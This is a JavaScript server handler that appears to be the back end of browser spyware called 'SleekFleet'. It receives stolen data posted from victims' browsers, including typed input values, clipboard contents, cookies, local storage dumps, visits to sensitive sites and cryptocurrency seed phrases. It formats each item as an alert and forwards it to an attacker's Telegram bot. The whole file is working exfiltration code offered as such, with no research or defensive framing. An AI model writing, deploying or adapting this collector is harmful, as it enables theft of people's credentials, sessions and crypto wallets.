export default async function handler(req, res) {
  // 1. Handle CORS Preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).json({});
  }

  // 2. Parse Body Correctly
  let payload = {};
  try {
    const rawBody = req.body || "";
    payload = typeof rawBody === 'string' ? JSON.parse(rawBody) : rawBody;
  } catch (e) {
    console.error("JSON Parse Error:", e);
    payload = {};
  }

  // 3. Check Method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    // 4. Format Message Based on Source Type
    let msg = "";
    const timestamp = new Date().toISOString();
    const url = payload.url || "N/A";
    const source = payload.source || "unknown";

    if (source === "input_field_capture") {
      msg = `
🚗 *SleekFleet Input Capture*

📍 Site: \`${url}\`
🏷️ Field Name: \`${payload.field_name || "Unknown"}\`
🔖 Placeholder: \`${payload.field_placeholder || "None"}\`
🔑 Value: \`${String(payload.value).substring(0, 100)}\`
⏰ Time: \`${timestamp}\`
      `.trim();
      
    } else if (source === "clipboard_sensitive" || source === "clipboard_tab_load" || source === "periodic_clipboard_check") {
      msg = `
🚗 *SleekFleet Clipboard Grab*

📋 Data: \`${String(payload.data).substring(0, 150)}\`
📍 Context: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "cookie_update") {
      msg = `
🚗 *SleekFleet Cookie Dump*

🍪 Cookies: \`${String(payload.data).substring(0, 200)}...\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "local_storage_dump") {
      const lsData = typeof payload.data === 'object' ? JSON.stringify(payload.data) : payload.data;
      msg = `
🚗 *SleekFleet Local Storage Dump*

💾 Data: \`${String(lsData).substring(0, 150)}...\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "tab_navigated_to_sensitive_site") {
      msg = `
🚗 *SleekFleet Sensitive Site Visit*

🌐 URL: \`${payload.data?.url || url}\`
📝 Title: \`${payload.data?.title || "N/A"}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "url_change") {
      msg = `
🚗 *SleekFleet URL Change*

🌐 New URL: \`${payload.data?.url || url}\`
📝 Title: \`${payload.data?.title || "N/A"}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "seed_phrase_detected" || source === "seed_phrase_input") {
      msg = `
🚨 *SEED PHRASE DETECTED!*

📋 Data: \`${String(payload.data).substring(0, 150)}\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else {
      // Fallback for any other source
      msg = `
🚗 *SleekFleet General Data*

📦 Source: \`${source}\`
📦 Data: \`${JSON.stringify(payload.data || payload).substring(0, 150)}\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();
    }

    // 5. Send to Telegram (Assuming you have this function defined elsewhere)
    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;

    if (tgToken && tgChatId) {
      const telegramUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
      await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: tgChatId,
          text: msg,
          parse_mode: 'Markdown'
        })
      });
    }

    return res.status(200).json({ success: true });

  } catch (error) {
    console.error("Handler Error:", error);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}
